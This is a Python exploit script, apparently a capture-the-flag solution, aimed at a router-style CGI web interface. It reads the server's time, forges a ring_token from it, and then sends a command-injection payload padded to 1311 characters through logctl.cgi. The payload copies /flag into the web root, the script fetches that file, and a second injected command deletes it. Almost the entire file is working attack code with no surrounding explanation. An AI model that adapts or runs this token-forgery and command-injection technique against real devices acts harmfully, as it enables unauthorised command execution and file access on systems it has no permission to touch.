# import getopt
# import sys
import warnings
import requests
import re
# import json
import socket
import socks
socks.setdefaultproxy(socks.HTTP, "127.0.0.1", 8080)
socket.socket = socks.socksocket

def exp(url):
    if url[len(url) - 1] != '/':
        print("[-] Target URL Format Error,The last char in url must be '/'.")
        return False
    
    warnings.filterwarnings('ignore')
    s = requests.session()
    s.verify = False
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
        'X-Forword-For': '192.168.1.1'
    }
    
    try:
        # print("[+] login...")
        ret = s.get("{}wifictl.cgi?ring_token=1".format(url), headers=header, timeout=8)
        if ret.status_code == 200:
            if "now time is" in ret.content.decode():
                time_ret = re.search(r"now time is (.+?)\.\n",ret.content.decode())
                if time_ret is None:
                    print("[-] time_ret re error, cannot get time")
                    return False
                else:
                    now_time = time_ret.group(1)
                    print("[+] now time is " + now_time)
            else:
                print("[-] time_ret re error, cannot get time")
                return False
        else:
            print("[-] status_code error, cannot get time")
            return False
        
        cmd = "a;" + "a"*1311 + "cat /flag >/var/www/html/flag;"
        new_url = "{}logctl.cgi?ring_token={}:1&aa={}".format(url, int(now_time)+1, cmd)
        ret = s.get(new_url, headers=header, timeout=8)
        # if ret.status_code == 200:
        #     print(ret.content.decode())
        # else:
        #     print("[-] status_code error, cannot get flag")
        #     return False
        ret = s.get("{}flag".format(url), headers=header, timeout=8)
        if ret.status_code == 200:
            print(ret.content.decode())
        else:
            print("[-] status_code error, cannot get flag")
            return False
        
        cmd = "a;" + "a"*1311 + "rm /var/www/html/flag;"
        new_url = "{}logctl.cgi?ring_token={}:1&aa={}".format(url, int(now_time)+1, cmd)
        ret = s.get(new_url, headers=header, timeout=8)
        if ret.status_code == 200:
            return True
        else:
            print("[-] status_code error, cannot rm flag")
            return False
    
    except Exception as reason:
        if 'timed' in repr(reason) or 'timeout' in repr(reason):
            print('[-] Fail, can not connect target for: timeout')
            return False
        else:
            print('[-] Fail, can not connect target for: {}'.format(repr(reason)))
            return False



if __name__ == '__main__':
    exp("http://192.168.100.125:11933/")